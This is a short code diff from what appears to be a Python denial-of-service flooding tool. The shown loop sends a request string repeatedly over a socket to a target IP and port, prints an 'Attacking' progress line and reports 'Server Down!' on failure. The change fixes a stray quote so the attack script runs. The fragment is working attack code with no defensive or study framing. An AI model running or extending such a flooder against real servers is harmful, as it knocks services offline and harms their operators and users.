@@ -85,7 +85,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx'))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
             print("\033[33m[\033[1m-\033[33m]\033[92mServer Down!")
